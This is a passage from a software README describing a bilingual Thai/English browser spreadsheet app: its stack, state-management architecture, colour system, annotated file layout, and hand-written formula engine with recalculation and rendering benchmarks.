figures and formulas still line up in columns in Plex Mono, while Thai words on the same line are
set in the same family as the body text rather than in the system's default monospace face.

<p align="center"><img src="public/screenshots/en/27-landing-stats.png" width="820"></p>
<p align="center"><sub>The inverted "Under the hood" band and the <b>Where this stops on purpose</b> section — the front page says where the app stops, and sends the rest of the limits here.</sub></p>

**How to get in touch sits at the foot of the page, beside the button that opens the app** (`/#contact`) —
email and LinkedIn written as two lines of the ledger like everything above them. The address is
**printed in full** rather than hidden behind a "Contact" button, with a copy button beside it, because
on webmail a `mailto:` link does nothing at all; the copy result is announced in a live region. The
footer gains an email link next to LinkedIn and GitHub as well.

### 🌐 Bilingual (Thai / English)

Click **EN**/**ไทย** in the top-right corner to switch the entire UI instantly — menus, buttons, all 37 formula
names/descriptions, alert text, and AI replies (both the keyword heuristic and real Claude) all follow the
selected language. The choice is remembered per browser · **On a first visit the language follows the
browser** (Thai anywhere in the browser's language list → Thai, otherwise English). Everyone used to land in
Thai, so a reader who could not read it had to find the EN button on a page they could not read · `<html lang>`
and the tab title follow too, so a screen reader reads in the right language. See [Bilingual UI (i18n)](#-bilingual-ui-i18n) for the
architecture behind it.

<p align="center"><img src="public/screenshots/en/07-language-switch.png" width="820" alt="The same sample sheet after one click on TH: every label in Thai"></p>

---

## 🛠 Tech stack

### Framework / language

| Technology | Version | Used for |
|---|---|---|
| [Next.js](https://nextjs.org) | 16 (App Router) | The main framework — every page is a client component, plus one API route (`/api/ai/formula`) |
| [React](https://react.dev) | 19 | UI library |
| [TypeScript](https://www.typescriptlang.org) | 5 (strict) | Type safety across the project, including the formula engine and the i18n dictionary's key parity |
| [Tailwind CSS](https://tailwindcss.com) | 4 | All styling, utility-class based |

### Core libraries

| Library | Used for |
|---|---|
| `zustand` | Central state (`sheetStore` — grid/selection/formula panel, `localeStore` — language) with a `persist` middleware autosaving to `localStorage` |
| `zundo` | Built on zustand to keep an edit history for undo/redo (sheet content only, never selection or transient UI) |
| `exceljs` | Reads/writes `.xlsx` files, preserving original formulas and formatting (chosen over `xlsx`/SheetJS, whose published npm version has unpatched security advisories) |
| `jspdf` + `jspdf-autotable` | Builds PDF exports from the computed sheet |
| `@supabase/supabase-js` | Optional cloud save — dynamically imported, so it never loads unless configured |
| `@anthropic-ai/sdk` | Connects to the Claude API for the AI assistant |
| `lucide-react` | UI icons |
| `clsx` | Conditional className composition |
| `vitest` | Unit tests for the formula engine, sort logic, JSON-to-table conversion, pagination, rate limiting, templates, file fidelity, conditional formatting and live blocks (1638 cases) |

> **Note:** No off-the-shelf formula library (e.g. HyperFormula) is used — the **formula engine is hand-written**
> (tokenizer, parser, evaluator, and functions) to keep full control over its behavior. See
> [Formula engine](#-formula-engine) for details.

### Tooling

- **Node.js 22.12+ or 24** and npm — the floor the test suite's Vite 7 needs · Node 20 is past end of life and not supported
- **ESLint 9** (`eslint-config-next`), including React 19-specific rules (`react-hooks/set-state-in-effect`, `react-hooks/refs`)
- **Vitest 3** for unit tests
- No database or separate backend — everything runs in one Next.js app

---

## 🏛 Architecture

### System overview

The app is **entirely client-rendered** (every page is `"use client"`) and all sheet data lives in the browser —
there's no server-side database. The server is used for exactly two things that can't (or shouldn't) happen in
the browser:

1. **Asking AI for a formula** — the Claude API key must never reach the user's side.
2. **Fetching live data from an external API/CSV** — credentials belong on the server, and fetching server-side
   means CORS is never the user's problem.

```mermaid
flowchart LR
    subgraph browser["User's browser"]
        UI["Web page (React, client components only)"]
        Store["Zustand stores<br/>sheetStore + localeStore"]
        LS[("localStorage<br/>sheet data + language")]
        Engine["Formula Engine<br/>all computation happens locally"]
    end

    subgraph server["Next.js Server"]
        API["/api/ai/formula"]
        SRC["/api/sources/*<br/>CRUD + test + :id/data"]
        Repo[("data/sources.json<br/>config + credentials<br/>— gitignored")]
    end

    Claude[("Claude API")]
    Ext[("External<br/>REST API / CSV")]

    UI <--> Store
    Store <--> LS
    UI --> Engine
    UI -->|"POST question + selection + locale"| API
    API -->|"ANTHROPIC_API_KEY set"| Claude
    API -->|"no key"| Heuristic["local keyword matching (heuristic)"]
    Claude --> API
    Heuristic --> API
    API -->|"formula + explanation"| UI

    UI -->|"polls on each source's interval"| SRC
    SRC <--> Repo
    SRC -->|"fetch + auth header"| Ext
    Ext -->|"raw JSON / CSV"| SRC
    SRC -->|"normalized TableData<br/>(no credentials attached)"| UI
```

### State management

`sheetStore` holds the document — the sheets, the selection and the grid's UI; the language, live data, cloud
save and live editing each have a store of their own (see the structure listing). It is wrapped in two middleware layers: `persist`
(autosave) wraps `temporal` from `zundo` (undo/redo) — each layer only "sees" part of the state, so selection or
transient UI never leaks into the undo history or the saved file:

```mermaid
flowchart TB
    Components["Components (features/*)<br/>read/write state via useSheetStore directly"]

    subgraph sheetStore["sheetStore"]
        direction TB
        Full["full state: sheets, activeSheetId,<br/>selectionBySheetId, filtersBySheetId,<br/>pending, clipboard, sidebarMode,<br/>dataPicker, busy"]
        Temporal["temporal (zundo) only sees: sheets<br/>→ undo/redo history"]
        Persist["persist only sees: sheets, activeSheetId<br/>→ autosave"]
    end

    Components --> Full
    Full -.->|partialize| Temporal
    Full -.->|partialize| Persist
    Temporal --> History[("undo/redo history<br/>in memory")]
    Persist --> LS[("localStorage:<br/>exceltogo-sheet-v2")]

    LocaleStore["localeStore (separate)<br/>persist only, no undo"] --> LS2[("localStorage:<br/>exceltogo-locale")]
```

**Why split it this way:** at one point during development, `selection` lived directly inside `sheets`. The
result: **merely clicking to select a cell counted as an undo-history entry** (zundo saw the state change).
Fixed by moving `selectionBySheetId`/`filtersBySheetId` out into their own top-level fields, so both `temporal`'s
and `persist`'s `partialize` only ever see `sheets` (plus `activeSheetId` for persist).

**How live data fits in:** `liveBlocks` (which block came from which source, where it sits, how much space it
takes) is stored **inside `sheets`**, because it genuinely is sheet content — placing, changing or removing a
block is undoable with Ctrl+Z and autosaved like anything else. `dataPicker` (which picker dialog is open) is
transient UI, so it stays outside `sheets`.

That creates a problem: **refreshes write into `sheets` too.** Left alone, every 5 seconds would push a new
undo entry, and Ctrl+Z would only step back through old values of the same number. `applyLiveData` therefore
wraps its writes in `temporal.pause()` / `temporal.resume()` — data still updates, the history never sees it.
The "Change" button (`replaceLiveBlock`) does "clear the old + place the new" inside a single action, so it
counts as one undo step rather than two.

### Colour system

Colours mean fixed things rather than whatever each screen reached for. There used to be four accents
(blue/violet/emerald/amber) split by *when the code was written*, which left three adjacent toolbar buttons
lighting up in three different colours.

| Colour | Means | Where |
|---|---|---|
| **Emerald** | Brand, primary actions, the open sidebar, live data | Every primary action in the app |
| **Blue** | **Where you are**, and nothing else | Selected cell, selected headers, the edit box, copy marching-ants |
| **Amber** | **Warnings**, and nothing else | Partial data, rate-limited |
| **Red** | Errors | Failed connection, `#REF!` |
| **Zinc** | Everything else | Including a template's read-only structure |

Blue stays separate deliberately: the selection has to stay legible over every background, live-data green
included, and it's the colour both Excel and Google Sheets use for the same job. Template input cells **no
longer use amber** — a form with twenty fields read as twenty alerts. They follow paper instead: the printed
parts are grey, the blanks are white.

Every piece of text clears WCAG AA: primary buttons are `emerald-700` (white on it is 5.48:1 — `emerald-600`
managed only 3.77 and failed), and hint text is `zinc-500` (4.83:1, where `zinc-400` was 2.56).

### Clean layering of `src/lib/`

Code with no React/UI dependency is fully separated, so it can be tested without a browser at all:

```
sheetStore.ts (Zustand actions)
      │
      ▼
sheet.ts / sheetClipboard.ts / sheetSort.ts   ← sheet data model + whole-sheet computation
      │
      ▼
formulaEngine/ (tokenizer → parser → evaluator → functions)
```

`sheet.ts` used to be one file covering the model, clipboard, TSV, and sorting all at once — it's now split into
3 focused files (`sheetClipboard.ts`, `sheetSort.ts`), with `sheet.ts` re-exporting both so every existing
`@/lib/sheet` import keeps working unchanged, with no need to touch import paths across the project.

---

## 📁 Project structure

```
src/
  app/manifest.ts            # The web app manifest, so it can go on a home screen
  proxy.ts                   # Mints a CSP nonce per request — the reason script-src has no 'unsafe-inline'
                              # + adds the origins of the APIs this user connected from the browser to
                              # connect-src (read from a cookie, through apiOrigins.ts)
  app/
    page.tsx                 # The landing page at / — features, screenshots, and the button into the app
    app/page.tsx             # The app itself at /app — assembles components from store state (holds none)
    guide/page.tsx           # /guide — connecting your own API or database, step by step, commands copyable
    api/ai/formula/route.ts  # API endpoint suggesting formulas (Claude, or a heuristic fallback)
    api/sources/             # Source CRUD, /test (run without saving), /[id]/data (fetch as a table)
                              # errorResponse.ts: failures → responses; a rate limit keeps a real 429 + its wait
    api/sample/                # Sample feeds whose numbers drift on their own — used by the screenshots and the
                              # gates; nothing is wired to them for you
                              # (sales, summary, and orders — paginated at 25 rows a page)
  store/
    sheetStore.ts            # Main Zustand store — sheets (incl. liveBlocks), activeSheetId, per-sheet
                              # selection/filters, the formula panel being filled in, which sidebar is open,
                              # which data picker is raised, plus every action —
                              # wrapped in persist (autosave) + zundo (undo/redo) covering all sheets together
    dataSourceStore.ts       # Live-data store — the source list (the server's + this browser's), each source's
                              # latest table, errors, and a per-source backoff (rate-limited, or repeatedly failing
                              # → stop calling for a while). Browser sources' settings, never the header value, are
                              # kept in localStorage `etg-browser-sources`; tables are neither persisted nor
                              # undoable: live data can always be re-fetched
    localeStore.ts           # Separate Zustand store for the selected UI language (th/en) — persisted the
                              # same way, but not tied to the sheet's undo/redo
    cloudStore.ts            # Cloud save (your own Supabase) — the signed-in session, the workbook list,
                              # save/open/delete, who it is shared with, and version history. Neither
                              # persisted nor undoable: the real copy lives in the database
    liveStore.ts             # The wiring for a live editing session — watch the document, put what changed
                              # on the wire, apply what arrives (the rules live in lib/cloud/). Off until
                              # someone turns it on, and only for a workbook already saved to the cloud
  i18n/                      # All UI text, split by language (no off-the-shelf i18n library)
    types.ts                 # The central `Messages` type — TypeScript enforces th.ts/en.ts key parity
    th.ts, en.ts              # The actual text dictionaries (buttons/labels/formula names+descriptions/alerts)
    messages.ts               # Just a plain locale -> Messages map, usable from both client and server (API route)
    index.ts                  # useT()/useLocale() (hooks for components) + getMessages() (used in the store)
  features/
    grid/SpreadsheetGrid.tsx        # The main grid (cell selection/editing, sticky headers, right-click
                                     # insert/delete row-column, hides filtered rows, accepts formula and
                                     # live-data drops, draws live-block borders + the selected block's toolbar)
    grid/useHeaderContextMenu.ts    # Hook: state + open/close for the row/column header right-click menu
    grid/useColumnFilterPopoverState.ts # Hook: state + open/close/toggle for the column filter popover
    grid/useClickAway.ts            # Shared hook: closes a popover/menu on an outside click or scroll
    grid/FormulaBar.tsx             # The formula bar above the grid
    grid/SheetTabs.tsx              # The sheet tab bar below the grid
    grid/TemplateBar.tsx            # Says the sheet is a template, how many fields, and offers the unlock
    grid/ColumnFilterPopover.tsx    # The per-column filter popover
    grid/ChartOverlay.tsx           # Charts floating over the cells: drag, resize, switch kind, delete
    grid/ChartPanel.tsx             # The "Charts" panel: build one from the selection + this sheet's list
    grid/ChartView.tsx              # The SVG drawing itself (bar/line/pie), sized to the box it is given
    grid/SelectionHandle.tsx        # The corner grip that extends a selection with a finger on touch
    grid/TouchActionBar.tsx         # The touch command row: copy, cut, paste, fill down, clear
    grid/ImportNotice.tsx           # Says what an import did, with an Undo button
    grid/CommentPopover.tsx         # The box that writes or clears the selected cell's note
    landing/LiveSheet.tsx           # The real grid in the hero — imports the app's own parser/evaluator,
                                     # so it is not a screenshot: edits recompute in the visitor's browser
    cloud/CloudPanel.tsx            # The cloud panel: sign in, save, and open from the user's own Supabase
    grid/ConditionalFormatPanel.tsx # The conditional-formatting panel: writing rules + this sheet's list
    grid/StorageNotice.tsx          # The dismissible bar saying the data lives only in this browser
    formulas/FormulaPalette.tsx     # The formula list panel — search/category filter/drag
    formulas/FormulaParamPanel.tsx  # The parameter-entry panel — pick a range from the grid + choose a scope
    ai/AIAssistantPanel.tsx         # The "ask AI" chat panel
    data/DataSourcePanel.tsx        # The "Data" panel: source list + blocks placed in this sheet
    data/SourceRow.tsx              # One compact source row: live status, ⋮ menu, primary "Insert into sheet" (also draggable)
    data/DataPicker.tsx             # Raises the picker from store state, so the panel and a block both can open it
    data/DataPickerDialog.tsx       # The picker: whole table / single value + preview + target cell + overwrite warning
    data/LiveBlockToolbar.tsx       # Toolbar floating above the selected block: refresh / change / remove
    data/valueLabel.ts              # Turns (column, sum/avg/count) into readable text in the selected language
    data/SourceSetupDialog.tsx      # Tech-side setup form for server-side sources + "test connection"
    data/BrowserSourceDialog.tsx    # The connect-from-this-browser form: test (rows × columns + first 5 rows), then
                                     # save and add to the sheet
    data/BrowserSourceError.tsx     # A browser fetch's error messages + the checklist and "Copy for IT" button
    data/allowOrigin.ts             # The one reload a new API origin costs (only if the last save landed),
                                     # then picking up where it was
    data/useServerSources.ts        # Does this deployment offer server-side sources (the mark the root layout sets)
    data/useLiveDataPolling.ts      # Root hook: loads sources + polls each on its own interval
                                     # (a tick landing inside a backoff makes no request at all)
    toolbar/Toolbar.tsx             # The top toolbar · on a phone its panel buttons become a named tab bar
    toolbar/MobileMenu.tsx          # The phone menu: connect an API/database, cloud, the guide, files, rows/columns · a dropdown panel at 1024–1365px
    toolbar/ImportChoiceDialog.tsx  # Asks before a file opens on top of work: add as sheets / replace / cancel
    toolbar/FillColorPopover.tsx    # Seven fill swatches and no fill
    toolbar/useKeyboardOpen.ts      # Whether the on-screen keyboard is up (visualViewport), to hide what it would cover
    toolbar/FormatBar.tsx           # The cell-formatting bar + sort buttons · on a phone the rest is a cell tools sheet
    toolbar/LanguageToggle.tsx      # The UI language switch button
  lib/                       # Core domain logic, no React/UI coupling — editable/testable independently
    formulaEngine/           # The hand-written formula engine — tokenizer.ts, parser.ts, ast.ts, evaluator.ts,
                              # functions.ts, coerce.ts, address.ts, shift.ts, structuralShift.ts,
                              # formulaProgram.ts (AST cache + what each formula reads),
                              # each with a matching *.test.ts run by Vitest
    formulaCatalog.ts        # The ready-made formula catalog's structure (id/params/how to build it) — the
                              # actual displayed name/description/labels come from src/i18n/th.ts,en.ts
    cellFormat.ts            # Cell formatting (bold/italic/underline/color/fill/font size/borders/alignment/
                              # number format) + pt↔px conversion and to/from Excel numFmt
    aiHeuristic.ts           # Keyword-based formula suggestion logic (used with no ANTHROPIC_API_KEY), bilingual
    aiPrompt.ts              # The prompt and reply parsing, shared by the server route and the browser (BYOK)
    aiRange.ts               # Which cells a question is about, from where the cursor is (AutoSum) + the headers sent along
    keyboardShortcuts.ts     # Every shortcut in one list; a test reads the handlers' source and fails if the two disagree
    sheetFilter.ts           # Which rows a filter hides — shared by the grid and by the spoken row count
    fillSeries.ts            # What dragging the corner continues into — numbers, Thai days and months, quarters, formulas
    sheetSearch.ts           # Find and replace over the raw text rather than the displayed result
    workbookRefs.ts          # The formula rewrites that are not a fact about one sheet: cross-sheet shifts, renames
    byok.ts                  # The visitor's own API key: this tab only, masked when shown
    sheet.ts                 # The core sheet data model, whole-sheet computation, applying a formula by scope,
                              # inserting/deleting rows-columns
    sheetClipboard.ts        # Copy/cut/paste, converting to/from TSV (for cross-app pasting)
    sheetSort.ts             # Detecting the range to sort + the actual sort
    sheetMerges.ts           # Merged cells: which cell renders, which are swallowed, shifting on edits (tested)
    sheetRange.ts            # A range of cells and how it follows an insert/delete — shared by charts
                              # and conditional formatting, which need identical behaviour
    cellComments.ts          # Notes attached to cells, and how they follow an insert/delete (tested)
    csv.ts                   # CSV read/write: delimiter sniffing, BOM, RFC 4180 quoting
    download.ts              # Handing a Blob to the browser as a file — its own module because the
                              # crash screen needs it and must not pull ExcelJS into that path
    sheetCodec.ts            # Between the in-memory model (a full grid) and what goes into localStorage
    saveHealth.ts            # Wraps localStorage so autosave never throws: a save that does not fit (quota,
                              # disabled storage) becomes a status the alert reads, not an exception escaping
                              # from an action — so export keeps working (tested)
                              # (only the cells holding something) — the old ceiling came from the
                              # sheet's size rather than its contents. Reads the old shape too (tested)
    pageSetup.ts             # How a sheet lands on paper: orientation, type size, rows repeated per page (tested)
    precedents.ts            # Which cells a formula reads, for drawing — cross-sheet refs dropped, huge ranges refused (tested)
    sheetFreeze.ts           # Rows and columns that stay put while the rest scrolls, and follow row edits (tested)
    dataValidation.ts        # What a cell will accept, refused before it is written, and the .xlsx mapping (tested)
    namedRanges.ts           # Names for ranges: what may be one, substituted at compile time, moved by row edits (tested)
    errorReport.ts           # Crash reports for the operator (off unless a URL is set) — keys, tokens, emails and Thai text scrubbed first (tested)
    crashRescue.ts           # Rescues the sheet out of localStorage when a render throws and offers it
                              # as one CSV per tab — touches no store, model or engine, since any of
                              # those may be what broke (tested)
    charts.ts                # Charts: reading a range into series and labels, the axis, the frame a chart
                              # is moved and resized by, its cell anchor, a pie's series, the legend
                              # per kind, shifting (tested)
    chartGeometry.ts         # A chart reduced to plain shapes, shared by the on-screen and exported
                              # drawings so the two cannot drift apart (tested)
    chartImage.ts            # A chart as a picture (SVG → PNG) for the .xlsx and the PDF (tested)
    gridGeometry.ts          # Row/column positions in pixels + where a new chart lands — shared with the
                              # grid so the two agree on exactly the same sizes (tested)
    cellLiteral.ts           # Whether a non-formula cell is a number or text — the one place that decides,
                              # shared by the engine and the .xlsx writer: a leading apostrophe, a
                              # leading zero or twelve-plus digits make it text (tested)
    excelDate.ts             # Dates as Excel keeps them: 1900-system serials (29 Feb 1900 included),
                              # the ISO forms read as dates, and Excel date codes like dd/mm/yyyy (tested)
    dateCells.ts             # Which cells are dates — so charts, pivots and CSV label with the date,
                              # not its serial
    sheetCompute.ts          # Works out every cell's value, and works out the next one without redoing
                              # the rest — keeps a dependency graph (tested, with a benchmark)
    rowWindow.ts             # Which rows a scrolled grid actually has to put in the DOM, so a
                              # ten-thousand-row sheet does not render ten thousand rows (tested)
    gridNavigation.ts        # Excel's cursor rules — Ctrl+arrow to the edge of the data, Ctrl+End,
                              # Ctrl+A around a block, Page keys measured in pixels (tested)
    demoMode.ts              # Switch that turns server-side sources off (NEXT_PUBLIC_DEMO_MODE), kept for old
                              # deployments + serverSourcesConfigured(): is SOURCES_ADMIN_TOKEN set, read per request
    apiOrigins.ts            # Which origins the CSP takes from the etg-api-origins cookie — each one re-derived
                              # with new URL(); https or localhost only, no wildcard, at most 20 (tested)
    site.ts                  # The one canonical public URL shared by metadata, sitemap and robots
    thaiMarks.ts             # Finds tone marks stacked on an upper vowel that must be redrawn higher (tested)
    pivot.ts                 # The group-and-summarise engine — pure functions, no sheet or UI (tested)
    xlsxChartXml.ts          # Builds the chart OOXML (chart part + drawing anchor) as pure strings (tested)
    xlsxCharts.ts            # Splices chart parts into the finished .xlsx and wires the rels (tested)
    dataSources/sourcesToken.ts  # The operator token on the browser side (kept in sessionStorage)
    dataSources/collect.ts   # The one source reader, shared by server and browser: pages, byte/time budget, 429,
                              # partial tables
    dataSources/browserSource.ts  # Fetching an API from the user's browser: CORS, no cookies, the header only to
                              # its own origin, plain http off-machine refused before sending, error codes (tested)
    dataSources/browserSecrets.ts # A browser source's header value — sessionStorage by source id, nowhere else
    server/rateLimiter.ts    # Per-IP ceiling on /api/ai/formula (in-memory fixed window) (tested)
    server/urlGuard.ts       # SSRF guard: checks resolved addresses and every redirect (tested)
    server/dbGuard.ts        # Reads a connection string and refuses a private one unless the operator allowed it (tested)
    usage.ts                 # Counting that the app was used without learning who used it — closed event list, once per load (tested)
    server/usageSink.ts      # Where a counted event ends up: a Supabase RPC, or one structured log line (tested)
    server/executeDbSource.ts # Connects, runs the saved statement in a read-only transaction, returns a table (tested)
    dataSources/sqlGuard.ts  # A saved query must be one SELECT — sees through comments, strings, dollar-quoting (tested)
    dataSources/dbRows.ts    # Driver rows → table: big integers stay text, dates go ISO, binary never lands in a cell (tested)
    server/sourcesAuth.ts    # The gate on the live-data API — no token means off (tested)
    server/secretBox.ts      # Encrypts a source's credential with AES-256-GCM (tested)
    cloud/config.ts          # Whether a cloud backend is attached at all (off unless set) (tested)
    cloud/workbook.ts        # The stored workbook shape, reading it back, and the conflict rule (tested)
    cloud/client.ts          # The Supabase client (dynamically imported), auth and workbook CRUD
    cloud/liveSession.ts     # Live-editing rules: which message wins, what to do with one, validating it (tested)
    cloud/liveRoom.ts        # One room's state and the edits held back while a cell is open (tested)
    cloud/sheetDiff.ts       # What changed between two workbooks, cheap enough to ask every keystroke (tested)
    cloud/realtimeChannel.ts # The Supabase Realtime pipe (broadcast + presence) — the one part that decides nothing
    conditionalFormat.ts     # Conditional formatting rules: compare/text/rank/colour scale/data bar, the
                              # per-cell styling they produce, and range shifting on edits (tested)
    sheetTemplate.ts         # Templates from a file: which cells are fields, dropdown options, width units (tested)
    liveBlocks.ts            # Writes a source's table into cells, tracks extent to clear shrinking data, sum/avg/count (tested)
    dataSources/             # Types + jsonToTable.ts (turns any JSON/CSV into a table) + paginate.ts
                              # (finds the next page from a Link header/next field/cursor/URL param) +
                              # rateLimit.ts (reads the wait out of headers + backoff maths) +
                              # fetchLimits.ts (the row, byte and time limits per refresh, enforced by the
                              # server and quoted by the panel) — all tested
    server/                  # Server-only: sourceRepo.ts (config + credentials in data/sources.json),
                              # executeSource.ts (the actual fetch: follows redirects itself, checks every hop,
                              # and hands the pages to collect.ts)
    excelIO.ts                # Importing/exporting a multi-sheet workbook (.xlsx) via exceljs, with cell formatting
    pdfExport.ts              # PDF export via jspdf + jspdf-autotable (the table, then the charts)
                              # Both are dynamically imported from sheetStore, so exceljs and jspdf
                              # load on the button press rather than in the app's first chunk (~433KB)
    pdfFont.ts                # The Thai font embedded into exported PDFs, fetched on export (tested)
  types/
    sheet-ui.ts               # Types for the grid's selection state
.github/workflows/
  ci.yml                     # CI: lint → check:readme → test → check:mutants → build on every push/PR, Node 22.12/24
                             #     plus an accessibility job: axe at two widths in a real browser
scripts/
  check-readme.mjs           # Pre-push README check (dependency-free) — see AGENTS.md for the rule
  check-screenshots.mjs      # Figures printed on a screenshot vs. the source (a new image needs an entry)
  check-rls.mjs              # Two real accounts on a real project: does the database refuse what it should
  check-deps.mjs             # Every advisory accounted for, with a reason and an expiry date
  check-bundle.mjs           # Size budgets, and the cloud client staying in a chunk of its own
  check-mutants.mjs          # Breaks the engine a character at a time and asks if the suite notices
  check-a11y.mjs             # axe at two widths plus sideways-scroll checks, against a production build
  make-social-preview.mjs    # Renders GitHub's 1280x640 card, counting its figures from source
public/
  screenshots/               # Screenshots from the running app — used by both the landing page and this README
  social-preview.png         # What GitHub shows when the repo is pasted — uploaded in Settings, not read from here
```

Every component under `features/` reads/writes state via `useSheetStore` directly (never through props passed
down from `page.tsx`), so there's no prop drilling, and new features (undo/redo, autosave, etc.) can be added in
one place: `store/sheetStore.ts`.

---

## 🧮 Formula engine

The most deliberately-built part of the project, because it's the one place a mistake fails silently — a wrong
number, with no error shown.

### Pipeline

```mermaid
flowchart LR
    Raw["Raw formula text<br/>e.g. =SUM(A1:A10)*2"] --> Tok["tokenizer.ts<br/>splits into tokens"]
    Tok --> Par["parser.ts<br/>builds an AST (recursive descent)"]
    Par --> Eval["evaluator.ts<br/>walks the AST to compute a result"]
    Eval -->|"calls"| Fn["functions.ts<br/>65 functions"]
    Eval -->|"getCell(row, col)"| Sheet[("other cells' values/formulas<br/>in the sheet")]
    Sheet -.-> Eval
    Eval --> Result["a number/text value,<br/>or a FormulaError"]
```

- **Tokenizer** splits the formula string into tokens (numbers, strings, cell refs `A1`, range refs `A1:B10`,
  functions, operators), supporting absolute references (`$A$1`) and the literal `#REF!` token.
- **Parser** is a plain recursive-descent parser that gets operator precedence right (`^` before `* /` before
  `+ -` before comparisons), with `^` as right-associative.
- **Evaluator** walks the AST to compute a result, distinguishing a scalar result from a range result (so
  functions like `VLOOKUP`/`SUMIF` know which argument is a range), and detects **circular references** with a
  `Set` of cells currently being computed — looping back to a cell already in progress returns `#CIRCULAR!`
  instead of overflowing the call stack.

### Recalculating only what changed

Every keystroke used to recompute the whole sheet and **re-parse every formula in it**. Measured on
the development machine, three formulas per row with one running-total column:

| Sheet size | Cost of one keystroke |
|---|---|
| 200 rows (600 cells hold formulas) | 11.9 ms |
| 1,000 rows (3,000 cells hold formulas) | 139.2 ms |
| 3,000 rows (9,000 cells hold formulas) | **1,244.9 ms** |

Past a thousand rows the grid is visibly behind the typing. At three thousand it is unusable.

**Two things changed:**

1. **Formulas compile once.** `formulaEngine/formulaProgram.ts` caches by formula text, so filling
   `=A1*B1` down three thousand rows parses one formula, not three thousand per keystroke.
2. **There is a dependency graph.** Each formula's precedents — cells and ranges — are read off its
   syntax tree, so an edit recomputes the transitive closure of whatever reads it and nothing else.

The second is only sound **because this language has no `INDIRECT` and no `OFFSET`**: every
reference is a node already sitting in the tree, so walking it gives the complete set. Adding
either function means the graph has to learn about references discovered at evaluation time, and
the code says so where it matters.

`TODAY()` and `NOW()` are marked **volatile** and recomputed every pass, because nothing in the
sheet changes to say they went stale. A cache that did not know this would freeze `=TODAY()` at the
moment it was first typed.

**After** (`sheetCompute.bench.test.ts` measures this on every run, so the numbers are not memory):

| | First compute | One edit |
|---|---|---|
| 1,000 rows (3,000 cells hold formulas) | 75 ms | **6.7 ms** |
| 3,000 rows (9,000 cells hold formulas) | 124 ms | **7.7 ms** |
| 3,000 rows + a running total | — | **8.5 ms** (edit near the end) |

These come from one `npm run verify` on the development machine and move by roughly a factor of
two between runs, so the test asserts on a *ratio* — one edit must cost at most a quarter of a full
recompute — and on loose ceilings, rather than on figures a busy CI runner would fail.

**The limit that is still there, and is not hidden:** editing the cell that all three thousand
running totals read — row 1 — still costs somewhere around 1,000–1,200 ms. That is a real fan-out; three thousand
sums genuinely have to be re-added, and the graph is right to say so. It is not a cache miss. The
benchmark measures that case too rather than leaving it to the prose.

**Proof it does not compute the wrong answer:** `sheetCompute.test.ts` makes 120 random edits and
compares the result against a from-scratch recompute after every one, plus a second run that stacks
200 edits before comparing. The tests also **assert how often the fast path actually ran** —
without that, an implementation that quietly fell back to a full recompute every time would pass
them all while doing none of the work.

### A ten-thousand-row sheet does not render ten thousand rows

The grid put every row in the DOM. At thirty rows that is right; at five thousand it is five
thousand `<tr>` elements the browser lays out and hit-tests on every render, of which fewer than
forty are on screen.

`rowWindow.ts` works out which band is visible and stands two spacer rows in for the rest, so the
scrollbar still measures exactly the same height. Checked in a browser by importing a 5,000-row
CSV: **41 `<tr>` in the DOM**, 160,064px of scroll height, and row 5,001 still reachable.

**That now holds on the first render too**, which it did not: before the container could be measured,
the window assumed the whole sheet was on screen, so importing a big sheet — or reloading with one
saved — laid out every row once, even though that render was replaced before anything was painted. It
now assumes one screenful (1,440px). Measured on a production build with a 10,000 × 10 `.xlsx`,
median of three runs:

| | Before | After |
|---|---|---|
| `<tr>` added to the DOM on import | 9,971 | **35** |
| Longest task on import | 7.5 s | **0.5 s** |
| Reload until A1 shows (sheet saved) | 7.8 s | **0.5 s** |

Not done yet: reading a large file in a Web Worker — the page still sits still for that half second.

Two things it is easy to get wrong, both pinned by tests: **a filtered row must take no height at
all**, or charts drift away from the data they sit next to; and **a merge that crosses the edge of
the window** — the `rowSpan` lives on the top-left cell, so if that cell is above the window the
cells it covers are not rendered either and the merge leaves a hole. The window reaches back to the
anchor for exactly that reason.

Below 200 rows nothing is virtualized: at that size the window costs more than it saves, and the
thirty-row sheet the app starts on renders exactly as it always did.

### Two different algorithms for adjusting references

The part that's easy to overlook: "shift a formula on copy" and "shift a formula on inserting/deleting a
row/column" are genuinely different algorithms. Get either one wrong and formulas silently compute the wrong
thing:

| | `shift.ts` (relative shift) | `structuralShift.ts` (structural shift) |
|---|---|---|
| Used when | Copy/paste, dragging the fill handle | Inserting/deleting a row or column |
| An absolute ref like `$A$1` | **Doesn't move** (standard Excel behavior) | Always moves (a row was really inserted, so every reference must shift) |
| A reference that lands exactly on a deleted position | Never happens in this path | Becomes `#REF!` |
| A range spanning the insert/delete point | Shifts the whole range equally | **Grows/shrinks** as appropriate (insert in the middle → range gets longer; delete an edge until empty → `#REF!`) |

### Supported functions

The drag-and-drop palette shows only the **37 most commonly used** formulas, but the engine itself supports
**65 functions** — the rest can be typed directly into a cell even with no card in the palette (e.g. `=MID(...)`,
`=YEAR(...)`, `=PROPER(...)`):

| Category | In the palette (37) | Also available by typing |
|---|---|---|
| Math | `SUM` `PRODUCT` `ROUND` `ABS` `SUMIF` `SUMIFS` | `ROUNDUP` `ROUNDDOWN` `SQRT` `POWER` `MOD` `INT` `CEILING` `FLOOR` `SUMPRODUCT` |
| Statistics | `AVERAGE` `COUNT` `COUNTA` `MIN` `MAX` `COUNTIF` `AVERAGEIF` `COUNTIFS` `AVERAGEIFS` | `COUNTBLANK` `RANK` `RANK.EQ` |
| Logic | `IF` `IFERROR` `AND` `OR` | `NOT` `IFNA` |
| Text | `CONCATENATE` `UPPER` `LOWER` `TRIM` `LEFT` `RIGHT` | `CONCAT` `MID` `LEN` `PROPER` `TEXT` `TEXTJOIN` `SUBSTITUTE` `FIND` `SEARCH` `CHAR` `CODE` |
| Date | `TODAY` `NOW` `DATEDIF` | `DATE` `DAY` `MONTH` `YEAR` |
| Lookup | `VLOOKUP` `XLOOKUP` `INDEX` `MATCH` | — |
| Arrays | `SEQUENCE` `TRANSPOSE` `UNIQUE` `SORT` `FILTER` | — |

> **The last ten came from asking the real model, not from working through the Excel reference.**
> `TEXTJOIN` `FIND` `RANK.EQ` `SUMPRODUCT` `CEILING` `CHAR` — and their obvious companions `SEARCH`
> `SUBSTITUTE` `FLOOR` `CODE` — are what the assistant answered with while this engine had no such
> function. See [Ask AI for a formula](#-ask-ai-for-a-formula) for how that was found.

**`INDEX` + `MATCH` replaces `VLOOKUP` and does what it cannot** — `VLOOKUP` can only search the
leftmost column of a table, and hard-codes *which column number* to return, which breaks silently
the moment someone inserts a column:

```
=INDEX(D2:D100,MATCH("Phuket",A2:A100,0))   read column D, searching column A
